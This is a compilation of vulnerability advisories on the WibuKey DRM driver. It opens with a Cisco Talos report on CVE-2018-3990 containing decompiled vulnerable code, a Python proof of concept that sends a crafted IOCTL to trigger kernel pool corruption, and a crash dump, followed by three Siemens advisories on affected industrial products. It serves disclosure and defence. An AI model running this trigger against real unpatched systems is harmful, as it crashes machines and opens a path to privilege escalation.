=== Content from talosintelligence.com_9b48cb99_20250125_080538.html ===


* [Cisco Login](/users/auth/saml)

* [Intelligence Center](/reputation)

  + [# Intelligence Center](/reputation)
  + BACK
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* [Vulnerability Research](/vulnerability_info)

  + [# Vulnerability Research](/vulnerability_info)
  + BACK
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* [Incident Response](/incident_response)

  + [# Incident Response](/incident_response)
  + BACK
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* [Blog](https://blog.talosintelligence.com)
* [Support](https://support.talosintelligence.com)

More

* Security Resources

  # Security Resources

  + BACK
  Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* Media

  # Media

  + BACK
  Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* Company

  # Company

  + BACK
  Company
  + [About Talos](/about)
  + [Careers](/careers)

* Under Attack?
* [Cisco Login](/users/auth/saml)

## Contact Cisco Talos Incident Response

×

Close

This form is for Incident Response service inquiries only, including emergency network security needs.

For reputation or categorization inquiries, visit the [Talos Support site](/support).
For emergency DDoS mitigation assistance, please contact the [Cisco Secure DDoS Protection Team](https://www.cisco.com/c/en/us/products/collateral/security/ddos-emergency-attack-mitigation-aag.pdf).

Name

Company (optional)

Email address

Phone number

Preferred communication:

Email

Phone

What Incident Response Service are you interested in?
General Talos IR services and retainer information
Emergency Response
IR Plan
IR Playbooks
IR Readiness Assessment
Tabletop Exercises
Compromise Assessment
Threat Hunting
Cyber Range Training
Intelligence on Demand

Please provide as much detail as possible so we can best address your needs

I acknowledge that this is an inquiry for Incident Response services and that any other use of this form will not receive a response.

Send Email
Cancel

# Talos Vulnerability Report

### TALOS-2018-0658

## WIBU-SYSTEMS WibuKey.sys 0x8200E804 pool corruption privilege escalation vulnerability

##### January 28, 2019

##### CVE Number

CVE-2018-3990

### Summary

An exploitable pool corruption vulnerability exists in the 0x8200E804 IOCTL handler functionality of WIBU-SYSTEMS WibuKey.sys Version 6.40 (Build 2400).

A specially crafted IRP request can cause a buffer overflow, resulting in kernel memory corruption and, potentially, privilege escalation. An attacker can send an IRP request to trigger this vulnerability.

### Tested Versions

WIBU-SYSTEMS WibuKey.sys Version 6.40 (Build 2400) - Windows 7 x86

### Product URLs

<https://www.wibu.com/products/wibukey.html>

### CVSSv3 Score

9.3 - CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

### CWE

CWE-787: Out-of-bounds Write

### Details

WibuKey is a complete DRM solution that is used by many applications, such as Straton, Archicad, GRAPHISOFT, V-Ray and many more. Part of WibuKey solution is in hardwar, as well as WibuKey Runtime for Windows, which contains necessary Windows drivers and services. This advisory is for a vulnerability in the driver installed by the Windows package.

This vulnerability can be triggered by sending IOCTL requests to the WibuKey device. Here are the default access controls on the device that allow any user on the system to send IOCTL requests:

```
accesschk.exe -q -o \Device\WibuKey
\Device\WibuKey
  Type: Device
  RW Everyone
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
  R  NT AUTHORITY\RESTRICTED

```

A buffer overflow vulnerability that causes pool corruption is located in the IOCTL handler for the `0x8200E804` control code. The vulnerable function is:

```
Line 1 	int __stdcall sub_A382D0F0(struct_buffer_1 *buffer, struct_allocatedBuffer *allocatedBuffer)
Line 2 	{
Line 3
Line 4 	  v4 = buffer->unsigned4;
Line 5 	  v5 = buffer->unsigned6;
Line 6 	  v6 = allocatedBuffer;
Line 7 	  _mm_storel_epi64(&allocatedBuffer->m128i0, (__m128i)0i64);
Line 8 	  v6->m128i0.m128i_i8[6] = v5;
Line 9 	  result = v5 - 16;
Line 10	  switch ( result )
Line 11	  {
Line 12	   (...)
Line 13		case 16:
Line 14		  v21 = buffer->dword14;
Line 15		  v22 = *(_DWORD *)&buffer->unsigned10;
Line 16		  if ( v22 > v21 )
Line 17			v22 = buffer->dword14;
Line 18		  if ( v4 >= v22 + 12 )
Line 19		  {
Line 20			memcpy((char *)&allocatedBuffer->m128i0.m128i_u64[1] + 4, &buffer->char18, v22);

```

The `buffer` represents the input buffer passed to the driver via the IRP request. ‘AllocatedBuffer `is a buffer that is allocated with a size, and is based on the` OutputBufferLength` specified by the caller.

As we can see at `line 18`, an integer overflow occurs and, as a result, we can pass this constraint with huge value of the `v22` variable (bigger than `v4`).

Since all values for `v22` and `v21` come from a buffer passed by the user, their values are fully controllable. Bypassing the check at `line 18` using an integer overflow, we end up at `line 20` with the `v22` variable having values in the range of `0xfffffff4 - 0xffffffff`.

That vulnerability leads to pool corruption, and can be turned into arbitrary code execution and privilege escalation by the attacker.

### Exploit Proof of Concept

def leak\_memory():
fileName = u’\\.\WibuKey’
hFile = win32file.CreateFileW(fileName,
win32con.GENERIC\_READ |win32con.GENERIC\_WRITE,
0,
None,
win32con.OPEN\_EXISTING, 0 , None, 0)
print “Handle ready : “,repr(hFile)

```
try:
	 ioctl = 0x8200E804
	 unsigned4    = random.randint(0,0xFFFF)
	 outBufferLen = 0xC #FIXED
	 if outBufferLen < unsigned4:
		 unsigned4 = outBufferLen

	 inputBuffer  = "XXXX" #gap
	 inputBuffer += struct.pack("<H",unsigned4) #unsigned4
	 inputBuffer += struct.pack("<B",32)   # unsigned6 FIXED
	 inputBuffer += "X" #gap
	 inputBuffer += struct.pack("<I",random.randint(0,0xFFFFFFFF) ) #dword8
	 inputBuffer += struct.pack("<I",random.randint(0,0xFFFFFFFF) ) #dwordC
	 inputBuffer += struct.pack("<I",0xFFFFFFFE ) #unsigned10
	 inputBuffer += struct.pack("<I",0xFFFFFFFD )#dword14
	 inputBuffer += struct.pack("<B",random.randint(0,0xFF))#char18
	 inputBuffer += "XXX"
	 inputBuffer += struct.pack("<I",random.randint(0,0xFFFFFFFF) ) #dword1c
	 inputBuffer += struct.pack("<B",random.randint(0,0xFF) )

	 inputBufferLen = len(inputBuffer)
	 print "Time to send IOCTL : 0x%x" % ioctl
	 buf = win32file.DeviceIoControl(hFile, ioctl,inputBuffer,outBufferLen)
except Exception as e:
	print e.message

```
### Crash Information

```
*** Fatal System Error: 0x000000cd
					   (0xA3731000,0x00000001,0x82C807F3,0x00000000)

WARNING: This break is not a step/trace completion.
The last command has been cleared to prevent
accidental continuation of this unrelated event.
Check the event, location and thread before resuming.
Break instruction exception - code 80000003 (first chance)

A fatal system error has occurred.
Debugger entered on first try; Bugcheck callbacks have not been invoked.

A fatal system error has occurred.

Connected to Windows 7 7601 x86 compatible target at (Tue Aug 28 15:09:38.044 2018 (UTC + 2:00)), ptr64 FALSE
Loading Kernel Symbols
...............................................................
................................................................
...............................
Loading User Symbols
..................................................
Loading unloaded module list
.....
*******************************************************************************
*                                                                             *
*                        Bugcheck Analysis                                    *
*                                                                             *
*******************************************************************************

Use !analyze -v to get detailed debugging information.

BugCheck CD, {a3731000, 1, 82c807f3, 0}

*** ERROR: Module load completed but symbols could not be loaded for WibuKey.sys
*** WARNING: Unable to verify checksum for win32file.pyd
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for win32file.pyd -
Probably caused by : WibuKey.sys ( WibuKey+52c1 )

Followup:     MachineOwner
---------

nt!RtlpBreakWithStatusInstruction:
82cc2110 cc              int     3
kd> !analyze -v
*******************************************************************************
*                                                                             *
*                        Bugcheck Analysis                                    *
*                                                                             *
*******************************************************************************

PAGE_FAULT_BEYOND_END_OF_ALLOCATION (cd)
N bytes of memory was allocated and more than N bytes are being referenced.
This cannot be protected by try-except.
When possible, the guilty driver's name (Unicode string) is printed on
the bugcheck screen and saved in KiBugCheckDriver.
Arguments:
Arg1: a3731000, memory referenced
Arg2: 00000001, value 0 = read operation, 1 = write operation
Arg3: 82c807f3, if non-zero, the address which referenced memory.
Arg4: 00000000, Mm internal code.

Debugging Details:
------------------

KEY_VALUES_STRING: 1

STACKHASH_ANALYSIS: 1

TIMELINE_ANALYSIS: 1

DUMP_CLASS: 1

DUMP_QUALIFIER: 0

BUILD_VERSION_STRING:  7601.17514.x86fre.win7sp1_rtm.101119-1850

DUMP_TYPE:  0

BUGCHECK_P1: ffffffffa3731000

BUGCHECK_P2: 1

BUGCHECK_P3: ffffffff82c807f3

BUGCHECK_P4: 0

WRITE_ADDRESS:  a3731000 Special pool

FAULTING_IP:
nt!memcpy+33
82c807f3 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]

MM_INTERNAL_CODE:  0

CPU_COUNT: 1

CPU_MHZ: c81

CPU_VENDOR:  GenuineIntel

CPU_FAMILY: 6

CPU_MODEL: 4f

CPU_STEPPING: 1

CPU_MICROCODE: 6,4f,1,0 (F,M,S,R)  SIG: B000021'00000000 (cache) B000021'00000000 (init)

DEFAULT_BUCKET_ID:  WIN7_DRIVER_FAULT

BUGCHECK_STR:  0xCD

PROCESS_NAME:  python.exe

CURRENT_IRQL:  2

ANALYSIS_SESSION_HOST:  DESKTOP-E4N8506

ANALYSIS_SESSION_TIME:  08-28-2018 15:10:00.0279

ANALYSIS_VERSION: 10.0.18206.1001 amd64fre

TRAP_FRAME:  a1bd49ec -- (.trap 0xffffffffa1bd49ec)
ErrCode = 00000002
eax=8b5c8e95 ebx=a3730ffc ecx=3ffffffe edx=00000001 esi=8b5c8e9c edi=a3731000
eip=82c807f3 esp=a1bd4a60 ebp=a1bd4a68 iopl=0         nv up ei pl nz na po nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010202
nt!memcpy+0x33:
82c807f3 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
Resetting default scope

LAST_CONTROL_TRANSFER:  from 82d26083 to 82cc2110

STACK_TEXT:
a1bd4534 82d26083 00000003 60dccd9b 00000065 nt!RtlpBreakWithStatusInstruction
a1bd4584 82d26b81 00000003 87a9c540 00000002 nt!KiBugCheckDebugBreak+0x1c
a1bd4948 82cd541b 00000050 a3731000 00000001 nt!KeBugCheck2+0x68b
a1bd49d4 82c883d8 00000001 a3731000 00000000 nt!MmAccessFault+0x106
a1bd49d4 82c807f3 00000001 a3731000 00000000 nt!KiTrap0E+0xdc
a1bd4a68 82f8b2a1 a3730ffc 8b5c8e98 fffffffd nt!memcpy+0x33
a1bd4a88 96b132c1 a3730ffc 8b5c8e98 fffffffd nt!Verifiermemcpy+0x3e
WARNING: Stack unwind information not available. Following frames may be wrong.
a1bd4aa8 96b1cfa1 00000001 0000000c 96b12d38 WibuKey+0x52c1
a1bd4ab4 96b12d38 0000000c a3730ff0 8725a358 WibuKey+0xefa1
a1bd4adc 82f784d9 a210bad8 a205f008 8725a358 WibuKey+0x4d38
a1bd4b00 82c7e54a 82e7299f a205f008 a210ba20 nt!IovCallDriver+0x73
a1bd4b14 82e7299f 8725a358 a205f008 a205f078 nt!IofCallDriver+0x1b
a1bd4b34 82e75b71 a210ba20 8725a358 00000000 nt!IopSynchronousServiceTail+0x1f8
a1bd4bd0 82ebc3f4 a210ba20 a205f008 00000000 nt!IopXxxControlFile+0x6aa
a1bd4c04 82c851ea 000000a0 00000000 00000000 nt!NtDeviceIoControlFile+0x2a
a1bd4c04 777070b4 000000a0 00000000 00000000 nt!KiFastCallEntry+0x12a
0021f98c 77705864 759e989d 000000a0 00000000 ntdll!KiFastSystemCallRet
0021f990 759e989d 000000a0 00000000 00000000 ntdll!ZwDeviceIoControlFile+0xc
0021f9f0 761da671 000000a0 8200e804 01d5cce4 KERNELBASE!DeviceIoControl+0xf6
0021fa1c 1ea11fd9 000000a0 8200e804 01d5cce4 kernel32!DeviceIoControlImplementation+0x80
00000000 00000000 00000000 00000000 00000000 win32file+0x1fd9

THREAD_SHA1_HASH_MOD_FUNC:  141b6c2e16af862151a0df26f8456bb2f5d1b067

THREAD_SHA1_HASH_MOD_FUNC_OFFSET:  fa85d9875de7d8856df2c96254754cdff060496f

THREAD_SHA1_HASH_MOD:  d46a340d9b1042cac75705a89fb9cf813334087e

FOLLOWUP_IP:
WibuKey+52c1
96b132c1 83c40c          add     esp,0Ch

FAULT_INSTR_CODE:  850cc483

SYMBOL_STACK_INDEX:  7

SYMBOL_NAME:  WibuKey+52c1

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: WibuKey

IMAGE_NAME:  WibuKey.sys

DEBUG_FLR_IMAGE_TIMESTAMP:  5853cbb3

STACK_COMMAND:  .thread ; .cxr ; kb

FAILURE_BUCKET_ID:  0xCD_VRF_WibuKey+52c1

BUCKET_ID:  0xCD_VRF_WibuKey+52c1

PRIMARY_PROBLEM_CLASS:  0xCD_VRF_WibuKey+52c1

TARGET_TIME:  2018-08-28T13:07:25.000Z

OSBUILD:  7601

OSSERVICEPACK:  1000

SERVICEPACK_NUMBER: 0

OS_REVISION: 0

SUITE_MASK:  784

PRODUCT_TYPE:  1

OSPLATFORM_TYPE:  x86

OSNAME:  Windows 7

OSEDITION:  Windows 7 WinNt (Service Pack 1) TerminalServer SingleUserTS Personal

OS_LOCALE:

USER_LCID:  0

OSBUILD_TIMESTAMP:  2010-11-20 09:42:49

BUILDDATESTAMP_STR:  101119-1850

BUILDLAB_STR:  win7sp1_rtm

BUILDOSVER_STR:  6.1.7601.17514.x86fre.win7sp1_rtm.101119-1850

ANALYSIS_SESSION_ELAPSED_TIME:  13b8

ANALYSIS_SOURCE:  KM

FAILURE_ID_HASH_STRING:  km:0xcd_vrf_wibukey+52c1

FAILURE_ID_HASH:  {f9836f4e-3d7b-f80c-4362-1fd3b7c43536}

Followup:     MachineOwner
---------

```
### Timeline

2018-09-14 - Vendor Disclosure

2018-12-19 - Vendor Patch

2019-01-28 - Public Release

##### Credit

Marcin 'Icewall' Noga of Cisco Talos.

---

[Vulnerability Reports](/vulnerability_reports) [Next Report

TALOS-2018-0659](/vulnerability_reports/TALOS-2018-0659) [Previous Report

TALOS-2018-0657](/vulnerability_reports/TALOS-2018-0657)

* + ###### [Intelligence Center](/reputation)
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* + ###### [Vulnerability Research](/vulnerability_info)
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* + ###### [Incident Response](/incident_response)
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* + ###### Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* + ###### Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* + ###### Support
  + [Support Documentation](https://support.talosintelligence.com)
* + ###### Company
  + [About Talos](/about)
  + [Careers](/careers)
  + [Cisco Security](https://www.cisco.com/c/en/us/products/security/product-listing.html)

###### Follow us

[![Cisco](/assets/logo_cisco_white-d87b7f7d3152ad412e48aad924a972cc5b802b7a53cb56b0792a4456c9b7b3a5.svg)](http://tools.cisco.com/security/center/home.x)

©
2025
Cisco Systems, Inc. and/or its affiliates. All rights
reserved. View our
[Privacy Policy.](http://www.cisco.com/web/siteassets/legal/privacy_full.html)



=== Content from cert-portal.siemens.com_90085e20_20250125_080535.html ===
Siemens Security Advisory by Siemens ProductCERT

SSA-760124: Multiple Vulnerabilities in Licensing Software for SICAM
230

2019-02-12
Publication Date:
2019-02-12
Last Update:
Current Version:
V1.0
CVSS v3.0 Base Score: 10.0

SUMMARY

Multiple vulnerabilities have been identiﬁed in the WibuKey Digital Rights Management (DRM) solution,
which affect the SICAM 230 process control system.

Siemens recommends users to apply the updates to WibuKey Digital Rights Management (DRM) provided
by WIBU SYSTEMS AG.

AFFECTED PRODUCTS AND SOLUTION

Affected Product and Versions

Remediation

SICAM 230:
All versions <= V7.20

Apply WibuKey Digital Rights Management
(DRM) version 6.50 or higher from WIBU SYS-
TEMS AG
https://www.wibu.com/support/user/downloads-
user-software.html

WORKAROUNDS AND MITIGATIONS

Siemens has identiﬁed the following speciﬁc workarounds and mitigations that customers can apply to
reduce the risk:

• CVE-2018-3991 can be mitigated by blocking port 22347/tcp e.g. on an external ﬁrewall.

GENERAL SECURITY RECOMMENDATIONS

Siemens strongly recommends applying the provided security updates using the corresponding tooling
and documented procedures made available with the product. If supported by the product, an automated
means to apply the security updates across multiple product instances may be used. Siemens strongly
recommends prior validation of any security update before being applied, and supervision by trained staff
of the update process in the target environment.

As a general security measure Siemens strongly recommends to protect network access with appropriate
mechanisms (e.g. ﬁrewalls, segmentation, VPN). It is advised to conﬁgure the environment according to
our operational guidelines in order to run the devices in a protected IT environment.

Recommended security guidelines to Secure Substations can be found at:

https://www.siemens.com/gridsecurity

PRODUCT DESCRIPTION

SICAM 230 is a scalable process control system for a broad range of applications and can be used from
an integrated energy system for utility companies to a monitoring system for smart grid applications.

SSA-760124

© Siemens AG 2019

Page 1 of 2

Siemens Security Advisory by Siemens ProductCERT

VULNERABILITY CLASSIFICATION

The vulnerability classiﬁcation has been performed by using the CVSS scoring system in version 3.0
(CVSS v3.0) (https://www.ﬁrst.org/cvss/). The CVSS environmental score is speciﬁc to the customer’s
environment and will impact the overall CVSS score. The environmental score should therefore be
individually deﬁned by the customer to accomplish ﬁnal scoring.

Vulnerability CVE-2018-3989

A specially crafted IRP (I/O request packet) can cause the driver to return uninitialized memory,
resulting in kernel memory disclosure.

CVSS v3.0 Base Score
CVSS Vector

4.3
CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N/E:P/RL:O/RC:C

Vulnerability CVE-2018-3990

A specially crafted IRP (I/O request packet) can cause a buffer overﬂow, resulting in kernel memory
corruption and, potentially, privilege escalation.

CVSS v3.0 Base Score
CVSS Vector

9.3
CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:P/RL:O/RC:C

Vulnerability CVE-2018-3991

A specially crafted TCP packet sent to port 22347/tcp can cause a heap overﬂow, potentially leading
to remote code execution.

CVSS v3.0 Base Score
CVSS Vector

10.0
CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:P/RL:O/RC:C

ADDITIONAL INFORMATION

For further inquiries on security vulnerabilities in Siemens products and solutions, please contact the
Siemens ProductCERT:

https://www.siemens.com/cert/advisories

HISTORY DATA

V1.0 (2019-02-12):

Publication Date

TERMS OF USE

Siemens Security Advisories are subject to the terms and conditions contained in Siemens’ underlying
license terms or other applicable agreements previously agreed to with Siemens (hereinafter "License
Terms"). To the extent applicable to information, software or documentation made available in or through
a Siemens Security Advisory, the Terms of Use of Siemens’ Global Website (https://www.siemens.com/
terms_of_use, hereinafter "Terms of Use"), in particular Sections 8-10 of the Terms of Use, shall apply
additionally. In case of conﬂicts, the License Terms shall prevail over the Terms of Use.

SSA-760124

© Siemens AG 2019

Page 2 of 2



=== Content from cert-portal.siemens.com_a8f90188_20250125_080536.html ===
Siemens Security Advisory by Siemens ProductCERT

SSA-844562: Multiple Vulnerabilities in Licensing Software for
WinCC OA

2019-02-25
Publication Date:
2019-04-09
Last Update:
Current Version:
V1.1
CVSS v3.0 Base Score: 10.0

SUMMARY

Multiple vulnerabilities have been identiﬁed in the WibuKey Digital Rights Management (DRM) solution,
which affect WinCC OA. Siemens recommends users to apply the updates to WibuKey Digital Rights
Management (DRM) provided by WIBU SYSTEMS AG.

AFFECTED PRODUCTS AND SOLUTION

Affected Product and Versions

Remediation

SIMATIC WinCC OA 3.14:
All versions < P025

SIMATIC WinCC OA 3.15:
All versions < P018

SIMATIC WinCC OA 3.16:
All versions < P007

Update to V3.14-P025 or apply WibuKey Digital
Rights Management
(DRM) version 6.50 or
higher from WIBU SYSTEMS AG
https://www.winccoa.com/downloads/category/
patches-315-16.html

Update to V3.15-P018 or apply WibuKey Digital
(DRM) version 6.50 or
Rights Management
higher from WIBU SYSTEMS AG
https://www.winccoa.com/downloads/category/
patches-315-17.html

Update to V3.16-P007 or apply WibuKey Digital
Rights Management
(DRM) version 6.50 or
higher from WIBU SYSTEMS AG
https://www.winccoa.com/downloads/category/
patches-316-1.html

WORKAROUNDS AND MITIGATIONS

Siemens has identiﬁed the following speciﬁc workarounds and mitigations that customers can apply to
reduce the risk:

• CVE-2018-3991 can be mitigated by blocking port 22347/tcp e.g. on an external ﬁrewall.

GENERAL SECURITY RECOMMENDATIONS

As a general security measure, Siemens strongly recommends to protect network access to devices
with appropriate mechanisms. In order to operate the devices in a protected IT environment, Siemens
recommends to conﬁgure the environment according to Siemens’ operational guidelines for Industrial
Security (Download), and to follow the recommendations in the product manuals.

Additional information on Industrial Security by Siemens can be found at: https://www.siemens.com/
industrialsecurity

SSA-844562

© Siemens AG 2019

Page 1 of 3

Siemens Security Advisory by Siemens ProductCERT

PRODUCT DESCRIPTION

The client-server HMI (human machine interface) system SIMATIC WinCC Open Architecture (OA) is part
of the SIMATIC HMI family. It is designed for use in applications requiring a high degree of customer-
speciﬁc adaptability, large or complex applications and projects that impose speciﬁc system requirements
or functions.

VULNERABILITY CLASSIFICATION

The vulnerability classiﬁcation has been performed by using the CVSS scoring system in version 3.0
(CVSS v3.0) (https://www.ﬁrst.org/cvss/). The CVSS environmental score is speciﬁc to the customer’s
environment and will impact the overall CVSS score. The environmental score should therefore be
individually deﬁned by the customer to accomplish ﬁnal scoring.

Vulnerability CVE-2018-3989

A specially crafted IRP (I/O request packet) can cause the driver to return uninitialized memory,
resulting in kernel memory disclosure.

CVSS v3.0 Base Score
CVSS Vector

4.3
CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N/E:P/RL:O/RC:C

Vulnerability CVE-2018-3990

A specially crafted IRP (I/O request packet) can cause a buffer overﬂow, resulting in kernel memory
corruption and, potentially, privilege escalation.

CVSS v3.0 Base Score
CVSS Vector

9.3
CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:P/RL:O/RC:C

Vulnerability CVE-2018-3991

A specially crafted TCP packet sent to port 22347/tcp can cause a heap overﬂow, potentially leading
to remote code execution.

CVSS v3.0 Base Score
CVSS Vector

10.0
CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:P/RL:O/RC:C

ADDITIONAL INFORMATION

For further inquiries on security vulnerabilities in Siemens products and solutions, please contact the
Siemens ProductCERT:

https://www.siemens.com/cert/advisories

HISTORY DATA

V1.0 (2019-02-25):
V1.1 (2019-04-09):

Publication Date
Added solutions

SSA-844562

© Siemens AG 2019

Page 2 of 3

Siemens Security Advisory by Siemens ProductCERT

TERMS OF USE

Siemens Security Advisories are subject to the terms and conditions contained in Siemens’ underlying
license terms or other applicable agreements previously agreed to with Siemens (hereinafter "License
Terms"). To the extent applicable to information, software or documentation made available in or through
a Siemens Security Advisory, the Terms of Use of Siemens’ Global Website (https://www.siemens.com/
terms_of_use, hereinafter "Terms of Use"), in particular Sections 8-10 of the Terms of Use, shall apply
additionally. In case of conﬂicts, the License Terms shall prevail over the Terms of Use.

SSA-844562

© Siemens AG 2019

Page 3 of 3



=== Content from cert-portal.siemens.com_e2f9e76e_20250125_080537.html ===
Siemens Security Advisory by Siemens ProductCERT

SSA-902727: Multiple Vulnerabilities in Licensing Software for
SISHIP Automation Solutions

2019-05-14
Publication Date:
2019-05-14
Last Update:
Current Version:
V1.0
CVSS v3.0 Base Score: 10.0

SUMMARY

Multiple vulnerabilities have been identiﬁed in the WibuKey Digital Rights Management (DRM) solution,
which affect SISHIP Automation Solutions. Siemens recommends users to apply the updates to WibuKey
Digital Rights Management (DRM) provided by WIBU SYSTEMS AG.

AFFECTED PRODUCTS AND SOLUTION

Affected Product and Versions

Remediation

SISHIP EMCS:
All versions

SISHIP IMAC:
All versions

SISHIP IPMS:
All versions

An updated software version for the solution, ﬁx-
ing the issue, is available. Customers are advised
to contact Siemens customer support.

An updated software version for the solution, ﬁx-
ing the issue, is available. Customers are advised
to contact Siemens customer support.

An updated software version for the solution, ﬁx-
ing the issue, is available. Customers are advised
to contact Siemens customer support.

WORKAROUNDS AND MITIGATIONS

Siemens has identiﬁed the following speciﬁc workarounds and mitigations that customers can apply to
reduce the risk:

• CVE-2018-3991 can be mitigated by blocking port 22347/tcp e.g. on an external ﬁrewall.

GENERAL SECURITY RECOMMENDATIONS

As a general security measure, Siemens strongly recommends to protect network access to devices
with appropriate mechanisms. In order to operate the devices in a protected IT environment, Siemens
recommends to conﬁgure the environment according to Siemens’ operational guidelines for Industrial
Security (Download), and to follow the recommendations in the product manuals.

Additional information on Industrial Security by Siemens can be found at: https://www.siemens.com/
industrialsecurity

PRODUCT DESCRIPTION

SISHIP Automation Solutions are SIMATIC PCS7 based solutions optimized for ship automation applica-
tions.

SSA-902727

© Siemens AG 2019

Page 1 of 2

Siemens Security Advisory by Siemens ProductCERT

VULNERABILITY CLASSIFICATION

The vulnerability classiﬁcation has been performed by using the CVSS scoring system in version 3.0
(CVSS v3.0) (https://www.ﬁrst.org/cvss/). The CVSS environmental score is speciﬁc to the customer’s
environment and will impact the overall CVSS score. The environmental score should therefore be
individually deﬁned by the customer to accomplish ﬁnal scoring.

Vulnerability CVE-2018-3989

A specially crafted IRP (I/O request packet) can cause the driver to return uninitialized memory,
resulting in kernel memory disclosure.

CVSS v3.0 Base Score
CVSS Vector

4.3
CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N/E:P/RL:O/RC:C

Vulnerability CVE-2018-3990

A specially crafted IRP (I/O request packet) can cause a buffer overﬂow, resulting in kernel memory
corruption and, potentially, privilege escalation.

CVSS v3.0 Base Score
CVSS Vector

9.3
CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:P/RL:O/RC:C

Vulnerability CVE-2018-3991

A specially crafted TCP packet sent to port 22347/tcp can cause a heap overﬂow, potentially leading
to remote code execution.

CVSS v3.0 Base Score
CVSS Vector

10.0
CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:P/RL:O/RC:C

ADDITIONAL INFORMATION

For further inquiries on security vulnerabilities in Siemens products and solutions, please contact the
Siemens ProductCERT:

https://www.siemens.com/cert/advisories

HISTORY DATA

V1.0 (2019-05-14):

Publication Date

TERMS OF USE

Siemens Security Advisories are subject to the terms and conditions contained in Siemens’ underlying
license terms or other applicable agreements previously agreed to with Siemens (hereinafter "License
Terms"). To the extent applicable to information, software or documentation made available in or through
a Siemens Security Advisory, the Terms of Use of Siemens’ Global Website (https://www.siemens.com/
terms_of_use, hereinafter "Terms of Use"), in particular Sections 8-10 of the Terms of Use, shall apply
additionally. In case of conﬂicts, the License Terms shall prevail over the Terms of Use.

SSA-902727

© Siemens AG 2019

Page 2 of 2


